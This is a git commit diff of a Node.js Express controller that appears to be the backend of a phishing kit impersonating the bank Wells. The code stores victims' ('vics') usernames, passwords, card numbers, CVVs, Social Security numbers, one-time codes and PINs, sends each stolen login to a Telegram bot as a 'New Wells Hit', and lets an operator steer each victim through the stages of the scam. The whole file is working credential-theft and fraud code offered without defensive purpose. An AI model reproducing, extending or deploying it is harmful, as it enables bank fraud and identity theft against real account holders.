f72b1ed42d6082fbd2a97c58ee5ad7950827b9ed
Your Name <you@example.com>
2023-04-23 21:54:49 +0100

    mak

--- controllers/wellsController.js
+++ controllers/wellsController.js
@@ -1,141 +1,165 @@
 const Wells = require("../models/wellsModel");
 const axios = require("axios");
+var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
-  const { owner } = req.params;
-  Wells.find({ owner })
-    .sort({ status: -1 })
-    .exec((err, vics) => {
-      if (err) {
-        console.log(err);
-        res.status(404).send("Error");
-        return;
-      }
-      res.send(vics);
-    });
+	const { owner } = req.params;
+	Wells.find({ owner })
+		.sort({ timestamp: -1 })
+		.exec((err, vics) => {
+			if (err) {
+				console.log(err);
+				res.status(404).send("Error");
+				return;
+			}
+			res.send(vics);
+		});
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { status }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { uniqueid, status } = req.body;
+	try {
+		await Wells.findOneAndUpdate({ uniqueid }, { status }).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const getInfo = async (req, res) => {
-  const { uniqueid } = req.params;
-  Wells.findOne({ uniqueid }).exec((err, vic) => {
-    if (err) {
-      console.log(err);
-      res.status(404).send("Error");
-      return;
-    }
-    res.send(vic);
-  });
+	const { uniqueid } = req.params;
+	Wells.findOne({ uniqueid }).exec((err, vic) => {
+		if (err) {
+			console.log(err);
+			res.status(404).send("Error");
+			return;
+		}
+		res.send(vic);
+	});
 };
 
 const submitLogin = async (req, res) => {
-  const { username, password, uniqueid, owner, ip } = req.body;
-  try {
-    await Wells.create({ uniqueid, username, password, status: 1, owner, ip });
-    await axios
-      .post(
-        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-        {
-          chat_id: 680379375,
-          text: `New Wells Hit:\n\n${username}:${password}`,
-          parse_mode: "Markdown",
-        }
-      )
-      .catch((e) => {
-        console.log(e);
-      });
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { username, password, uniqueid, owner, ip } = req.body;
+	try {
+		await Wells.create({
+			uniqueid,
+			username,
+			password,
+			status: 1,
+			owner,
+			ip,
+			timestamp: moment().format(),
+		});
+		await axios
+			.post(
+				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+				{
+					chat_id: 680379375,
+					text: `New Wells Hit:\n\n${username}:${password}`,
+					parse_mode: "Markdown",
+				}
+			)
+			.catch((e) => {
+				console.log(e);
+			});
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitLoginAgain = async (req, res) => {
-  const { username, password, uniqueid } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { username, password, status: 0 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { username, password, uniqueid } = req.body;
+	try {
+		await Wells.findOneAndUpdate(
+			{ uniqueid },
+			{ username, password, status: 11, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitCard = async (req, res) => {
-  const { ccnum, ccexp, cvv, uniqueid } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 9 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { ccnum, ccexp, cvv, uniqueid } = req.body;
+	try {
+		await Wells.findOneAndUpdate(
+			{ uniqueid },
+			{ ccnum, ccexp, cvv, status: 5, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitSSN = async (req, res) => {
-  const { ssn, uniqueid } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { ssn, status: 7 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { ssn, uniqueid } = req.body;
+	try {
+		await Wells.findOneAndUpdate(
+			{ uniqueid },
+			{ ssn, status: 7, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitOtp = async (req, res) => {
-  const { otp, uniqueid } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { otp, uniqueid } = req.body;
+	try {
+		await Wells.findOneAndUpdate(
+			{ uniqueid },
+			{ otp, status: 3, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitPin = async (req, res) => {
-  const { pin, uniqueid } = req.body;
-  try {
-    await Wells.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { pin, uniqueid } = req.body;
+	try {
+		await Wells.findOneAndUpdate(
+			{ uniqueid },
+			{ pin, status: 9, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const deleteEntry = async (req, res) => {
-  const { uniqueid } = req.body;
-  try {
-    await Wells.deleteOne({ uniqueid });
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { uniqueid } = req.body;
+	try {
+		await Wells.deleteOne({ uniqueid });
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 module.exports = {
-  getOwnerVics,
-  command,
-  getInfo,
-  submitLogin,
-  submitLoginAgain,
-  submitOtp,
-  submitCard,
-  submitSSN,
-  submitPin,
-  deleteEntry,
+	getOwnerVics,
+	command,
+	getInfo,
+	submitLogin,
+	submitLoginAgain,
+	submitOtp,
+	submitCard,
+	submitSSN,
+	submitPin,
+	deleteEntry,
 };
